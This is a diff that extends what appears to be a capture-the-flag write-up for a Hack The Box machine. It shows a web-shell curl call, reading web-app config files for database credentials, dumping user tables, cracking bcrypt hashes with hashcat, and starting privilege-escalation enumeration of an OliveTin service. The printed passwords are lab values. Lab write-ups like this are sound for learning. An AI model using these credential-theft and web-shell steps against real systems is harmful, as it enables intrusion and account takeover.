@@ -287,46 +287,109 @@ curl "http://support_001.enigma.htb/files/SHELL.php?c=python3%20-c%20%27import%2
 
 ---
 
+## after digging found db credentioanls in **`/var/www/html/roundcube/config/config.inc.php`**
+
+
+```
+cat /var/www/html/roundcube/config/config.inc.php
+```
+
+<img width="1259" height="268" alt="image" src="https://github.com/user-attachments/assets/1aec113a-33c9-490a-9733-96fd3a82642a" />
+
+```
+mysql -u roundcube -p'Yo270x26!gTx02' -D roundcubemail -e "SHOW TABLES;"
+```
+
+<img width="1193" height="469" alt="image" src="https://github.com/user-attachments/assets/a7195998-c7ef-4455-a630-345c83164443" />
+
+```
+mysql -u roundcube -p'Yo270x26!gTx02' -D roundcubemail -e "SELECT * FROM session;"
+```
+
+
+## also found OpenSTAManager database credentials in :
+
+```
+cat /var/www/html/openstamanager/config.inc.php 2>/dev/null
+```
+
+<img width="1397" height="257" alt="image" src="https://github.com/user-attachments/assets/d4d265d6-6916-46f6-98cc-7a7c7c0d2a9a" />
+
+```
+DB Host: localhost
+DB Username: brollin
+DB Password: Fri3nds@9099
+DB Name: openstamanager
+```
+
+## let's look at users table 
+
+```
+mysql -u brollin -p'Fri3nds@9099' -D openstamanager -e "DESCRIBE zz_users;"
+mysql -u brollin -p'Fri3nds@9099' -D openstamanager -e "SELECT id, username, password, email, enabled FROM zz_users;"
+```
+
+<img width="1571" height="546" alt="image" src="https://github.com/user-attachments/assets/b35c2e8c-ed49-483c-95bb-3a06d49cc772" />
+
+```
+echo '$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu' > admin.hash
+echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris.hash
+
+hashcat -m 3200 -a 0 admin.hash /usr/share/wordlists/rockyou.txt
+hashcat -m 3200 -a 0 haris.hash /usr/share/wordlists/rockyou.txt
+```
+
+<img width="1106" height="183" alt="image" src="https://github.com/user-attachments/assets/fe8593e4-c328-4f4b-a834-27f054c0af5f" />
+
+## now we have haris passowrd let's get first flag 
+
+```
+haris : bestfriends
+```
+
+<img width="1066" height="150" alt="image" src="https://github.com/user-attachments/assets/13f1b138-ad72-4dba-b1e9-828ac517b070" />
+
+---
+
+# privesc
+
+
+## Check All Listening Ports
+
+```
+ss -tln
+```
+
+<img width="932" height="372" alt="image" src="https://github.com/user-attachments/assets/809de1ad-4655-4f31-bb69-46d6c8689da9" />
 
 
 
 
+```
+curl http://127.0.0.1:1337/
+```
+
+<img width="1479" height="487" alt="image" src="https://github.com/user-attachments/assets/7dda5825-b961-4b1e-a37a-2ecdc7964bbe" />
 
 
+### what is OliveTin
+
+ This is a program that provides:
+
+> A web interface for executing shell commands on the server
+
+But in a controlled manner (using predefined commands)
 
 
+```
+find / -name "*olive*" 2>/dev/null
+```
 
+<img width="917" height="143" alt="image" src="https://github.com/user-attachments/assets/915e43bc-98d1-466d-8327-f9ab0920c906" />
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+```
+ls -la /opt/OliveTin/OliveTin-linux-amd64/var/helper-actions/
+```
 
 
 
